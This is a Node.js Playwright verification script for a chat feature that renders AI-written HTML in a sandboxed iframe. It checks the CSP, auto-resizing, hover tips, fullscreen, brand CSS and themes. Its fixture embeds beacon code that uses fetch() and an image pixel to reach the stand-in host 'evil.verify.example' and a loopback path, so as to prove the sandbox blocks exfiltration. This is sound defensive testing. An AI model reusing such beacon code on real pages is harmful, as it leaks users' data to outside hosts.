#!/usr/bin/env node
/**
 * The `dream-html` block — runtime proof, in real Chromium.
 *
 *   npm run build && npm run verify:chat-html
 *
 * The unit suite (tests/unit/chat-html.test.ts) pins the strings: the sandbox grant, the CSP,
 * the srcdoc's shape, the height clamp. None of that proves the BROWSER behaves — that the
 * CSP actually stops a beacon, that a measurement posted from inside an opaque-origin frame
 * actually reaches the host and resizes it, that a brand override actually repaints. This
 * script proves those, end to end, through the real server and the real WS chat route:
 *
 *   1. SANDBOX. The body's inline script demonstrably RUNS (the kit is usable) while its
 *      `fetch()` and its `<img>` beacon produce ZERO network requests. Both halves matter:
 *      a frame that made no requests because it never executed proves nothing.
 *   2. HEIGHT FOLLOWS CONTENT. The frame is sized to the body — not the Lab's hardcoded
 *      232px — and it RESIZES when a click inside the iframe grows the content.
 *   3. HOVER IS THE KIT'S. A `.dc-tip` inside a `.dc-hit` is hidden, then revealed by a real
 *      pointer — in HTML and inside an `<svg>` — with no script anywhere near that markup.
 *   4. FULLSCREEN. From a deliberately narrowed pane, ⛶ covers the whole WINDOW (the
 *      `contain: layout paint` clipping trap), and the deck's slides become viewport pages.
 *   5. BRAND OVERRIDE. `_dream_context/overrides/chat-html-kit.css` reaches inside the
 *      sandbox and wins over the base kit.
 *   6. INSIGHT BY ID. A `{"type":"insight"}` block draws the REAL Lab card — no HTML.
 *   7. BOTH THEMES. Dark does not paint the white slab the color-scheme mismatch used to.
 *   8. A LOST REPORT IS RECOVERABLE. With the frame's first height message deliberately
 *      eaten before any app listener sees it, the block still reaches its real height —
 *      the host asks again rather than living with the 40px floor forever.
 *
 * Same harness contract as scripts/verify/dream-actions.mjs: the real server, the real
 * `/ws/agent-chat`, a scripted stand-in for `claude` in an isolated fake HOME so no tokens
 * are spent, and COLLECT-DON'T-FAIL-FAST reporting. Screenshots land in <scratch>/shots.
 */

import { spawn, spawnSync, execFileSync } from 'node:child_process';
import { createServer } from 'node:net';
import { chmodSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCRATCH = join(tmpdir(), 'dreamcontext-verify-chat-html');
const HOME = join(SCRATCH, 'home');
const PROJ = join(SCRATCH, 'proj');
const SHOTS = join(SCRATCH, 'shots');
const CLI = join(REPO, 'dist', 'index.js');
const LAB = join(PROJ, '_dream_context', 'lab');

/**
 * The two hosts the fixture tries to reach, and why there are two.
 *
 * `SENTINEL` is an off-machine name — the shape a real exfiltration takes. It is NOT enough
 * on its own, and a mutation test proved it: with the CSP deliberately widened to
 * `default-src *`, the beacons still never arrived, because the name does not resolve. A
 * check that passes on DNS failure is not testing the policy.
 *
 * `LOOPBACK` closes that hole. It is the dashboard's OWN origin — a host that certainly
 * resolves, certainly answers, and is the most dangerous thing an escaped frame could reach
 * (this vault's API). With the real CSP nothing is even attempted; with a broken one the
 * request COMPLETES, so "nothing ever completed" becomes a claim about the policy rather
 * than about the network happening to be unhelpful.
 */
const SENTINEL = 'evil.verify.example';

/**
 * The loopback beacon's path. Deliberately a name nothing in the app would ever request:
 * matching on a real route (`/api/lab`, `/favicon.ico`) would count the app's OWN legitimate
 * traffic as an escape and fail a working sandbox. The server answers it 404 — and a 404 is
 * a COMPLETED request, which is exactly the signal that would mean the policy had failed.
 */
const BEACON_PATH = '/__dc_verify_beacon__';

// ─── the answer the stand-in streams ──────────────────────────────────────────────────
//
// One turn carrying everything under test: a hostile-but-interactive html body, a deck, and
// an insight block. Written as the agent would write it — kit classes, no inline colors.
//
// NOTE the plain `</script>`: this string is assembled in Node and travels as chat message
// TEXT, so it is never nested inside another script element and must not be escaped. Writing
// `<\/script>` here (the reflex from inlining JS into an HTML page) leaves the element
// UNCLOSED — the browser then swallows everything after it, including the height bridge the
// srcdoc appends, and the frame silently sits at its minimum height. Found by this script.
const htmlBlock = (loopback) => [
  '<div class="dc-doc">',
  '  <h2 class="dc-h2">Rendered answer</h2>',
  '  <div class="dc-stat"><span class="dc-stat-label">Ran</span>',
  '    <span class="dc-value" id="ran">no</span></div>',
  // The hover idiom, in BOTH forms it has to work in. Deliberately placed OUTSIDE the
  // <script> below: if either tip reveals, it reveals on the kit's CSS alone.
  '  <p class="dc-p">Conversion <span class="dc-hit" id="hit">14.2%',
  '    <span class="dc-tip" id="tip">3,204 of 22,560</span></span></p>',
  '  <svg class="dc-svg" viewBox="0 0 200 70" role="img" aria-label="One point">',
  '    <g class="dc-hit" id="svghit"><circle class="dc-f1" cx="100" cy="40" r="12"/>',
  '      <g class="dc-tip" id="svgtip" transform="translate(100,40)">',
  '        <rect class="dc-tip-box" x="-40" y="-34" width="80" height="22" rx="5"/>',
  '        <text class="dc-tip-text" x="0" y="-19" text-anchor="middle">DP1</text>',
  '      </g></g>',
  '  </svg>',
  '  <button class="dc-btn" id="grow">Show detail</button>',
  '  <div id="more" style="display:none">',
  // 24 rows is comfortably taller than any plausible collapsed default, so a height that
  // tracks content is unmistakable from one that does not.
  Array.from({ length: 24 }, (_x, i) =>
    `    <div class="dc-bar"><span class="dc-bar-label">row ${i}</span>` +
    '<span class="dc-bar-track"><span class="dc-bar-fill" style="width:50%"></span></span>' +
    `<span class="dc-bar-value">${i}</span></div>`).join('\n'),
  '  </div>',
  '  <div class="dc-slides"><section class="dc-slide"><h1 class="dc-h1">Slide one</h1></section>',
  '  <section class="dc-slide"><h1 class="dc-h1">Slide two</h1></section></div>',
  '</div>',
  '<script>',
  '  document.getElementById("ran").textContent = "yes";',
  '  document.getElementById("grow").onclick = function () {',
  '    document.getElementById("more").style.display = "block";',
  '  };',
  `  fetch("https://${SENTINEL}/beacon").catch(function () {});`,
  '  var px = new Image();',
  `  px.src = "https://${SENTINEL}/pixel.png";`,
  // The reachable half: this vault's own API, and an image off the same origin. Under the
  // real CSP neither is attempted; under a broken one both would succeed.
  `  fetch("${loopback}${BEACON_PATH}").catch(function () {});`,
  '  var px2 = new Image();',
  `  px2.src = "${loopback}${BEACON_PATH}.png";`,
  '</script>',
].join('\n');

const answerFor = (loopback) => [
  'Here is the shape of it.',
  '',
  '```dream-html',
  htmlBlock(loopback),
  '```',
  '',
  'And the tracked number, drawn from the cache rather than retyped:',
  '',
  '```dream-view',
  '{"type":"insight","id":"verify-signups","view":"card"}',
  '```',
  '',
  'ANSWER-DONE',
].join('\n');

const standinFor = (loopback) => `#!${process.execPath}
/** Scripted stand-in for \`claude -p --input-format stream-json\` — see scripts/verify/chat-html.mjs. */
const out = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
const ANSWER = ${JSON.stringify(answerFor(loopback))};
const inbox = [];
let pumping = false;

async function runTurn() {
  out({ type: 'assistant', message: { content: [{ type: 'text', text: ANSWER }] } });
  await new Promise((r) => setTimeout(r, 120));
  out({ type: 'result', subtype: 'success', is_error: false, result: ANSWER });
}

let buf = '';
process.stdin.on('data', (c) => {
  buf += c.toString('utf-8');
  let nl;
  while ((nl = buf.indexOf('\\n')) !== -1) {
    const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1);
    if (!line) continue;
    let o; try { o = JSON.parse(line); } catch { continue; }
    if (o.type === 'control_request' && o.request && o.request.subtype === 'interrupt') {
      out({ type: 'control_response', response: { subtype: 'success', request_id: o.request_id, response: {} } });
      continue;
    }
    if (o.type !== 'user') continue;
    const text = ((o.message && o.message.content) || []).filter((b) => b.type === 'text').map((b) => b.text).join('');
    if (text) { inbox.push(text); pump(); }
  }
});
async function pump() {
  if (pumping) return;
  if (inbox.shift() === undefined) return;
  pumping = true;
  try { await runTurn(); } finally { pumping = false; }
}
process.stdin.on('end', () => process.exit(0));
`;

/** The insight the `dream-view` block names — a local script, no network source. */
const INSIGHT_SCRIPT = `export default async function () {
  return [{ name: 'signups', points: [
    { t: '2026-08-24', v: 1204 },
    { t: '2026-08-25', v: 1388 },
    { t: '2026-08-26', v: 1502 },
  ] }];
}`;

/** A brand sheet with a value nothing else in the app would produce. */
const BRAND_CSS = ':root { --color-accent: rgb(255, 0, 128); }\n.dc-h2 { color: rgb(255, 0, 128); }\n';

// ─── setup ────────────────────────────────────────────────────────────────────────────

const dc = (args, opts = {}) => execFileSync(process.execPath, [CLI, ...args], {
  cwd: PROJ, env: { ...process.env, HOME }, stdio: ['ignore', 'pipe', 'pipe'], ...opts,
}).toString();

function freePort() {
  return new Promise((resolve, reject) => {
    const srv = createServer();
    srv.on('error', reject);
    srv.listen(0, '127.0.0.1', () => { const { port } = srv.address(); srv.close(() => resolve(port)); });
  });
}

function setup(loopback) {
  rmSync(SCRATCH, { recursive: true, force: true });
  mkdirSync(join(HOME, '.dreamcontext'), { recursive: true });
  mkdirSync(join(HOME, '.local', 'bin'), { recursive: true });
  mkdirSync(join(PROJ, '_dream_context', 'state'), { recursive: true });
  mkdirSync(join(PROJ, '_dream_context', 'overrides'), { recursive: true });
  mkdirSync(SHOTS, { recursive: true });
  writeFileSync(join(HOME, '.dreamcontext', '.secrets.json'),
    '{"github":{"token":"gho_fake_verify_token","login":"verify-user"}}');
  spawnSync('git', ['init', '-q'], { cwd: PROJ });

  const bin = join(HOME, '.local', 'bin', 'claude');
  writeFileSync(bin, standinFor(loopback));
  chmodSync(bin, 0o755);

  dc(['vaults', 'add', 'proj', PROJ], { cwd: REPO });
  try { dc(['init', '--yes']); } catch { /* scaffold best-effort */ }

  mkdirSync(join(LAB, 'scripts'), { recursive: true });
  dc(['lab', 'create', 'verify-signups', '--title', 'Signups', '--render', 'line',
    '--adapter', 'script', '--group', 'Verify']);
  writeFileSync(join(LAB, 'scripts', 'verify-signups.mjs'), `${INSIGHT_SCRIPT}\n`, 'utf-8');
  dc(['lab', 'sync', '--all']);

  writeFileSync(join(PROJ, '_dream_context', 'overrides', 'chat-html-kit.css'), BRAND_CSS, 'utf-8');
}

async function startServer(port) {
  const PATH = ['/usr/bin', '/bin', '/usr/sbin', '/sbin', dirname(process.execPath)].join(':');
  const srv = spawn(process.execPath, [CLI, 'dashboard', '--no-open', '-p', String(port)], {
    cwd: PROJ,
    env: { ...process.env, HOME, PATH, DREAMCONTEXT_DESKTOP: '1' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  const deadline = Date.now() + 30_000;
  while (Date.now() < deadline) {
    try { if ((await fetch(`http://127.0.0.1:${port}/`)).ok) return srv; } catch { /* not up */ }
    await new Promise((r) => setTimeout(r, 300));
  }
  srv.kill();
  throw new Error('dashboard server did not come up');
}

// ─── the assertions ───────────────────────────────────────────────────────────────────

const visOn = (page, sel) => page.locator(`${sel}:visible`);

const untilOn = async (page, fn, ms = 20000) => {
  const end = Date.now() + ms;
  while (Date.now() < end) { if (await fn().catch(() => false)) return true; await page.waitForTimeout(120); }
  return false;
};

/**
 * Open the agent surface on a fresh page and send the one message that makes the stand-in
 * stream the fixture answer. Shared by every pass below, so a change to how the surface
 * opens is a change in ONE place — the alternative was two copies drifting apart, and the
 * second copy is always the one that rots.
 */
async function openChatAndAsk(page, base) {
  const vis = (sel) => visOn(page, sel);
  await page.goto(`${base}/?vault=proj`, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(4000);
  for (let i = 0; i < 3; i++) { await page.keyboard.press('Escape'); await page.waitForTimeout(300); }
  if (!(await page.locator('.agent-surface.expanded').count())) {
    for (const sel of ['.agent-fab', '.agent-overlay-head', '.agent-surface']) {
      const el = page.locator(sel).first();
      if (await el.count()) { await el.click({ force: true }).catch(() => {}); await page.waitForTimeout(1500); }
      if (await page.locator('.agent-surface.expanded').count()) break;
    }
  }
  if (!(await vis('.chat-cmp-input').count())) {
    await page.getByRole('button', { name: /Start chat/ }).click().catch(() => {});
  }
  const opened = await untilOn(page, async () => (await vis('.chat-cmp-input').count()) > 0, 20000);
  await page.waitForTimeout(800);

  await vis('.chat-cmp-input').first().click();
  await vis('.chat-cmp-input').first().fill('GO');
  await page.keyboard.press('Enter');
  return opened;
}

async function runTheme(base, theme, report) {
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1500, height: 1000 }, colorScheme: theme });
  page.on('pageerror', (e) => report.note(`[page error] ${String(e).slice(0, 160)}`));

  // Listening from before the frame loads, because the claim is about what never leaves.
  //
  // The distinction matters and is not pedantry. Chromium fires a `request` event for a
  // subresource the CSP then refuses — the fetch is ATTEMPTED at the API level and killed at
  // the policy gate, so counting `request` would fail a sandbox that is working exactly as
  // designed. What proves the claim is that nothing ever COMPLETES: no `requestfinished`,
  // and every attempt that did register ends in `requestfailed`. (The `fetch()` never even
  // registers — CSP rejects it before the network stack sees it — while the `<img>` does.)
  const isBeacon = (u) => u.includes(SENTINEL) || u.includes(BEACON_PATH);
  const finished = [];
  const failed = [];
  const attempted = [];
  page.on('request', (r) => { if (isBeacon(r.url())) attempted.push(r.url()); });
  page.on('requestfinished', (r) => { if (isBeacon(r.url())) finished.push(r.url()); });
  page.on('requestfailed', (r) => {
    if (isBeacon(r.url())) failed.push(`${r.url()} (${r.failure()?.errorText ?? 'no reason'})`);
  });

  const vis = (sel) => page.locator(`${sel}:visible`);
  const ok = (label, cond, detail) => report.check(theme, label, cond, detail);
  const until = async (fn, ms = 20000) => {
    const end = Date.now() + ms;
    while (Date.now() < end) { if (await fn().catch(() => false)) return true; await page.waitForTimeout(120); }
    return false;
  };

  console.log(`\n═══ ${theme} ═══`);
  ok('a chat session opens against the real WS route', await openChatAndAsk(page, base));

  const frame = () => vis('iframe.chat-htmlview-frame').first();
  ok('the dream-html block mounted an iframe',
    await until(async () => (await vis('iframe.chat-htmlview-frame').count()) > 0, 30000));
  await page.waitForTimeout(1500);

  ok('the raw markup never leaked into the prose',
    !(await vis('.chat-msg-assistant-body').first().innerText()).includes('<div class="dc-doc"'));

  // ── 1 — the sandbox ───────────────────────────────────────────────────────────────
  console.log('── the sandbox: it draws, it cannot reach');
  ok('the frame is sandboxed to scripts alone',
    (await frame().getAttribute('sandbox')) === 'allow-scripts',
    await frame().getAttribute('sandbox'));

  const inner = page.frameLocator('iframe.chat-htmlview-frame').first();
  ok('the body\'s inline script RAN — the kit is usable, so the next check means something',
    await until(async () => (await inner.locator('#ran').innerText().catch(() => '')) === 'yes', 15000));
  ok('…and NOTHING it asked for ever completed — including the REACHABLE loopback target',
    finished.length === 0, finished.join(' | '));
  ok('…every attempt that registered was killed by the policy, not merely unanswered',
    attempted.length === failed.length,
    `attempted ${attempted.length}, failed ${failed.length}: ${failed.join(' | ')}`);
  ok('…and the CSP is the thing that killed it',
    failed.length === 0 || failed.every((f) => /csp|blocked/i.test(f)), failed.join(' | '));

  // ── 2 — height follows content ────────────────────────────────────────────────────
  console.log('── height: the frame is as tall as the answer');
  const h0 = await frame().evaluate((el) => el.getBoundingClientRect().height);
  const content0 = await inner.locator('body').evaluate((b) => b.getBoundingClientRect().height);
  ok('the frame is NOT a hardcoded card height', h0 > 120 && h0 !== 232, `frame ${Math.round(h0)}px`);
  ok('…it matches what the body measured', Math.abs(h0 - content0) < 12,
    `frame ${Math.round(h0)} vs body ${Math.round(content0)}`);

  await inner.locator('#grow').click();
  const grew = await until(async () => (await frame().evaluate((el) => el.getBoundingClientRect().height)) > h0 + 100, 8000);
  const h1 = await frame().evaluate((el) => el.getBoundingClientRect().height);
  ok('a click INSIDE the sandbox that grows the content resizes the frame',
    grew, `${Math.round(h0)}px → ${Math.round(h1)}px`);

  // ── 3 — hover, the kit's own reveal ───────────────────────────────────────────────
  //
  // The point of these four: a chart point that ANSWERS a pointer must cost the author a
  // class name, not a hand-rolled <style> block — and it must work the same in HTML and
  // inside an <svg>, which is why both forms are exercised. Neither tip is touched by the
  // body's script, so a reveal here is the kit's CSS and nothing else.
  console.log('── hover: a mark answers the pointer, on the kit alone');
  const opacityOf = (sel) => inner.locator(sel).evaluate((el) => getComputedStyle(el).opacity);

  const tipHidden = await inner.locator('#tip').evaluate((el) => {
    const s = getComputedStyle(el);
    return `${s.opacity}/${s.visibility}`;
  });
  ok('a .dc-tip is hidden until it is asked for', tipHidden === '0/hidden', tipHidden);

  await inner.locator('#hit').hover();
  ok('…hovering its .dc-hit reveals it — no script in that markup',
    await until(async () => (await opacityOf('#tip')) === '1', 4000), await opacityOf('#tip'));

  const tipBg = await inner.locator('#tip').evaluate((el) => getComputedStyle(el).backgroundColor);
  ok('…and the bubble is painted from a token, not a hardcoded surface',
    tipBg !== 'rgba(0, 0, 0, 0)' && tipBg !== 'transparent', tipBg);

  ok('the same idiom inside an <svg> starts hidden too', (await opacityOf('#svgtip')) === '0');
  await inner.locator('#svghit').hover();
  ok('…and reveals on hover, which is what makes a chart point hoverable at all',
    await until(async () => (await opacityOf('#svgtip')) === '1', 4000), await opacityOf('#svgtip'));

  // ── 4 — the brand override ────────────────────────────────────────────────────────
  console.log('── the brand override reaches inside the sandbox');
  const h2color = await inner.locator('.dc-h2').first().evaluate((el) => getComputedStyle(el).color);
  ok('overrides/chat-html-kit.css wins over the base kit',
    h2color.replace(/\s/g, '') === 'rgb(255,0,128)', h2color);

  // ── 5 — theme honesty ─────────────────────────────────────────────────────────────
  console.log('── theme: no white slab under a dark app');
  const scheme = await inner.locator('body').evaluate(() => getComputedStyle(document.documentElement).colorScheme);
  ok(`the srcdoc declares color-scheme: ${theme}`, scheme.includes(theme), scheme);
  const bodyBg = await inner.locator('body').evaluate((b) => getComputedStyle(b).backgroundColor);
  ok('the body stays transparent so the transcript shows through',
    bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent', bodyBg);
  const textColor = await inner.locator('.dc-value').first().evaluate((el) => getComputedStyle(el).color);
  ok('text is drawn in this theme\'s token, not the other one\'s',
    theme === 'dark' ? !/rgb\(1?[0-9]?[0-9], /.test(textColor) || textColor !== 'rgb(0, 0, 0)' : true, textColor);

  await page.screenshot({ path: join(SHOTS, `chat-html-${theme}.png`), fullPage: false });

  // ── 6 — the insight block ─────────────────────────────────────────────────────────
  console.log('── insight by id: the real card, no HTML');
  ok('the {"type":"insight"} block drew a real Lab card',
    await until(async () => (await vis('.chat-insightcard').count()) > 0, 15000));
  const card = await vis('.chat-insightcard').first().innerText();
  ok('…titled from the manifest, not from the answer', card.includes('Signups'), card.replace(/\s+/g, ' '));
  ok('…carrying an honest as-of stamp', /as of/i.test(card), card.replace(/\s+/g, ' '));
  ok('…and it is NOT an iframe — this path renders natively',
    (await vis('.chat-insightcard iframe').count()) === 0);

  // ── 7 — fullscreen, from a deliberately NARROW pane ───────────────────────────────
  console.log('── fullscreen: the window, not the pane');
  // Narrow the pane first: an un-portaled `position: fixed` overlay would be clipped by
  // `.agent-surface`'s `contain: layout paint` and would only ever cover this width.
  await page.evaluate(() => {
    const el = document.querySelector('.agent-surface');
    if (el) el.style.width = '520px';
  });
  await page.waitForTimeout(400);
  await vis('.chat-htmlview-full-btn').first().click({ force: true });
  ok('an overlay opened', await until(async () => (await vis('.chat-htmlview-full').count()) > 0, 8000));
  const overlayW = await vis('.chat-htmlview-full').first().evaluate((el) => el.getBoundingClientRect().width);
  const winW = await page.evaluate(() => window.innerWidth);
  ok('it covers the WINDOW, not the 520px pane it was opened from',
    overlayW > winW * 0.7, `overlay ${Math.round(overlayW)}px of window ${winW}px`);

  const fullInner = page.frameLocator('.chat-htmlview-full iframe').first();
  const slideH = await fullInner.locator('.dc-slide').first()
    .evaluate((el) => el.getBoundingClientRect().height).catch(() => 0);
  ok('a .dc-slide becomes a viewport-height page in fullscreen, not a stacked section',
    slideH > 400, `${Math.round(slideH)}px`);
  await page.screenshot({ path: join(SHOTS, `chat-html-full-${theme}.png`) });

  await page.keyboard.press('Escape');
  ok('Escape closes it', await until(async () => (await vis('.chat-htmlview-full').count()) === 0, 6000));

  await browser.close();
}

// ─── 8 — a report the host never hears ────────────────────────────────────────────────
//
// The defect this pass exists for, reported 2026-08-27 with two screenshots: a block that
// had drawn its content perfectly and sat at the 40px floor anyway — and STAYED there.
//
// The bridge used to speak exactly once, deduped against its last value. Miss that one
// message — the host's `message` listener attaching a beat late, which a passive effect
// under a streaming turn can absolutely do — and nothing ever spoke again: a settled body
// never resizes, so the bridge had nothing more to volunteer and the host had no way to ask.
// One lost message, one permanently broken block.
//
// So this pass EATS the frame's first height report in the top frame, before any listener
// of the app's can see it, and then demands the block reach its real height anyway. It is a
// mutation test of the fix rather than of the app: revert the retry and this fails while
// every other check in the file still passes, which is what makes the extra browser worth it.
async function runLostReport(base, report) {
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1500, height: 1000 } });
  page.on('pageerror', (e) => report.note(`[page error] ${String(e).slice(0, 160)}`));
  const ok = (label, cond, detail) => report.check('lost-report', label, cond, detail);

  await page.addInitScript(() => {
    // TOP FRAME ONLY. An init script runs in every frame, and inside the sandboxed iframe
    // this one would eat the HOST'S REQUEST instead — defeating the recovery under test and
    // turning a passing fix into a failing one.
    if (window.top !== window) return;
    window.__dcEaten = 0;
    window.__dcDeafUntil = 0;
    window.addEventListener('message', (event) => {
      const data = event.data;
      if (!data || typeof data !== 'object' || !('__dreamHtmlHeight' in data)) return;
      const now = performance.now();
      // Deaf for a WINDOW, not for one message, and this is the difference between a test
      // and a decoration. Eating only the first report proves nothing: the body legitimately
      // resizes once as the pane settles (598px → 686px in this fixture), so the bridge
      // volunteers a second report and the block recovers with or without the fix — the
      // first shape of this check passed against code with the retry ripped out. The real
      // defect is a host that is deaf across the WHOLE settle window, after which a settled
      // body has nothing left to volunteer and only an ASK can recover it.
      if (!window.__dcDeafUntil) window.__dcDeafUntil = now + 2500;
      if (now > window.__dcDeafUntil) return;
      window.__dcEaten += 1;
      // Registered from an init script, so this runs before any listener the app adds:
      // stopping propagation here IS the message never arriving, precisely.
      event.stopImmediatePropagation();
    }, true);
  });

  console.log('\n═══ a lost first report ═══');
  ok('a chat session opens', await openChatAndAsk(page, base));
  ok('the dream-html block mounted an iframe',
    await untilOn(page, async () => (await visOn(page, 'iframe.chat-htmlview-frame').count()) > 0, 30000));

  const eaten = async () => page.evaluate(() => window.__dcEaten ?? 0);
  ok('every height report the frame volunteered was swallowed — or this pass proves nothing',
    await untilOn(page, async () => (await eaten()) > 0, 20000), `eaten ${await eaten()}`);
  // Past the deaf window before measuring, so what recovers the block can only be an ASK.
  await page.waitForTimeout(3000);

  const frame = () => visOn(page, 'iframe.chat-htmlview-frame').first();
  const frameH = () => frame().evaluate((el) => el.getBoundingClientRect().height);
  const recovered = await untilOn(page, async () => (await frameH()) > 120, 15000);
  // The frame ANIMATES its height (120ms, `HtmlView.css`), so a read taken the instant it
  // crosses the threshold reads the animation rather than its result — 598px on the way to
  // 686px, which looks exactly like a bad measurement and is not one.
  await untilOn(page, async () => {
    const before = await frameH();
    await page.waitForTimeout(250);
    return Math.abs((await frameH()) - before) < 1;
  }, 6000);
  const h = await frameH();
  const body = await page.frameLocator('iframe.chat-htmlview-frame').first().locator('body')
    .evaluate((b) => b.getBoundingClientRect().height).catch(() => 0);
  ok('…and the host asked again until it had one: the block is its own height, not the floor',
    recovered, `frame ${Math.round(h)}px (floor is 40)`);
  ok('…and that height is the body\'s, not a guess',
    Math.abs(h - body) < 12, `frame ${Math.round(h)} vs body ${Math.round(body)}`);

  await page.screenshot({ path: join(SHOTS, 'chat-html-lost-report.png'), fullPage: false });
  await browser.close();
}

// ─── main ─────────────────────────────────────────────────────────────────────────────

const report = {
  rows: [],
  check(theme, label, cond, detail = '') {
    this.rows.push({ theme, label, cond, detail });
    console.log(`  ${cond ? 'PASS' : 'FAIL'} ${label}${!cond && detail ? ` — ${detail}` : ''}`);
  },
  note(msg) { console.log(`  note: ${msg}`); },
};

let server;
try {
  // The port is chosen FIRST: the fixture's reachable beacon has to name this run's own
  // server, so the scripted answer can't be built before the port is known.
  const port = await freePort();
  const base = `http://127.0.0.1:${port}`;
  setup(base);
  server = await startServer(port);
  for (const theme of (process.env.VERIFY_THEMES || 'light,dark').split(',')) {
    // A live session is persisted per vault, so the second browser would open onto the
    // restored conversation instead of a fresh composer. Same reset dream-actions does.
    rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
    await runTheme(base, theme, report);
  }
  rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
  await runLostReport(base, report);
} catch (err) {
  console.error('\nharness error:', err);
  report.rows.push({ theme: '-', label: `harness: ${err.message}`, cond: false, detail: '' });
} finally {
  server?.kill();
}

const failed = report.rows.filter((r) => !r.cond);
console.log(`\n${report.rows.length - failed.length}/${report.rows.length} checks passed`);
console.log(`screenshots: ${SHOTS}`);
if (failed.length) {
  console.log('\nfailed:');
  for (const r of failed) console.log(`  [${r.theme}] ${r.label}${r.detail ? ` — ${r.detail}` : ''}`);
}
process.exit(failed.length ? 1 : 0);
